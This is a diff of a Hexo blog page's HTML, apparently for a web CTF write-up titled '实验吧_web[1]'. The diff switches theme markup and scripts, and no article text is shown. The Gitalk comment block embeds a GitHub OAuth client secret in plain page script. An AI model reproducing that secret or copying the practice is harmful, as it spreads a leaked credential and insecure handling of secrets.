+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://zhzhdoai.github.io/2019/05/10/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-1/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
 
-<!-- Custom -->
 
 
-    
-  </main>
-
-  
-    <a id="scroll-top-button" href="#" role="button">
-      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
     </a>
-  
-
-  
-    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v"
-                 for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
 </div>
-  
 
-  
 
-  
 
-  <footer class="mt-5">
-  <div class="text-center py-3">
-    <div>
-      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
-      <i class="iconfont icon-love"></i>
-      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
-        <span>Fluid</span></a>
+        </div>
     </div>
+
     
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2019/05/12/open-basedir%E4%BB%A3%E7%A0%81%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">open_basedir代码绕过总结</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2019/05/09/Thinkphp5-3%E6%96%87%E4%BB%B6%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Thinkphp5至3版本文件缓存漏洞</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
 
     
 
-    
-  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script src="/js/md5.min.js"></script>
+    <script>
+        var gitalk = new Gitalk({
+            clientID: '7d7576c71632f14d639a',
+            clientSecret: '3d7f7e4c0e9a43a2cc5334d68aee612090df8b70',
+            repo: 'zhzhdoai.github.io',
+            owner: 'zhzhdoai',
+            admin: 'zhzhdoai',
+            id: md5(location.pathname),
+            perPage: 50,
+            distractionFreeMode: 'false'
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>osword &copy; 2015 - 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
 </footer>
 
-<!-- SCRIPTS -->
-<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
-<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
-<script  src="/js/debouncer.js" ></script>
-<script  src="/js/main.js" ></script>
-
-<!-- Plugins -->
-
-
-  
-    <script  src="/js/lazyload.js" ></script>
-  
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
 
 
 
-  
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://zhzhdoai.github.io/2019/05/10/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-1/&title=《实验吧_web[1]》 — osword's blog&pic=http://zhzhdoai.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://zhzhdoai.github.io/2019/05/10/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-1/&title=《实验吧_web[1]》 — osword's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://zhzhdoai.github.io/2019/05/10/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-1/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《实验吧_web[1]》 — osword's blog&url=http://zhzhdoai.github.io/2019/05/10/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-1/&via=http://zhzhdoai.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://zhzhdoai.github.io/2019/05/10/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-1/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=http://zhzhdoai.github.io/2019/05/10/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-1/" alt="微信分享二维码">
+</div>
 
 
 
-  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
-  <script  src="/js/clipboard-use.js" ></script>
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
 
 
 
-  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
 
 
 
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
 
-  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
-  <script>
-    $(document).ready(function () {
-      var boardCtn = $('#board-ctn');
-      var boardTop = boardCtn.offset().top;
 
-      tocbot.init({
-        tocSelector: '#tocbot',
-        contentSelector: '#post-body',
-        headingSelector: 'h1,h2,h3,h4,h5,h6',
-        linkClass: 'tocbot-link',
-        activeLinkClass: 'tocbot-active-link',
-        listClass: 'tocbot-list',
-        isCollapsedClass: 'tocbot-is-collapsed',
-        collapsibleClass: 'tocbot-is-collapsible',
-        collapseDepth: 0,
-        scrollSmooth: true,
-        headingsOffset: -boardTop
-      });
-      if ($('.toc-list-item').length > 0) {
-        $('#toc').css('visibility', 'visible');
-      }
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
     });
-  </script>
-
-
-
-  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
-  <script>
-    var typed = new Typed('#subtitle', {
-      strings: [
-        '  ',
-        "实验吧_web[1]&nbsp;",
-      ],
-      cursorChar: "_",
-      typeSpeed: 70,
-      loop: false,
-    });
-    typed.stop();
-    $(document).ready(function () {
-      $(".typed-cursor").addClass("h2");
-      typed.start();
-    });
-  </script>
-
-
-
-  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
-  <script>
-    anchors.options = {
-      placement: "right",
-      visible: "hover",
-      
-    };
-    var el = "h1,h2,h3,h4,h5,h6".split(",");
-    var res = [];
-    for (item of el) {
-      res.push(".markdown-body > " + item)
-    }
-    anchors.add(res.join(", "))
-  </script>
-
-
-
-  <script  src="/js/local-search.js" ></script>
-  <script>
-    var path = "/local-search.xml";
-    var inputArea = document.querySelector("#local-search-input");
-    inputArea.onclick = function () {
-      searchFunc(path, 'local-search-input', 'local-search-result');
-      this.onclick = null
-    }
-  </script>
-
-
-
-  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
-  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-  <script>
-    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
-      function () {
-        var element = document.createElement('a');
-        $(element).attr('data-fancybox', 'images');
-        $(element).attr('href', $(this).attr('src'));
-        $(this).wrap(element);
-      }
-    );
-  </script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+})();
+</script>
 
 
 
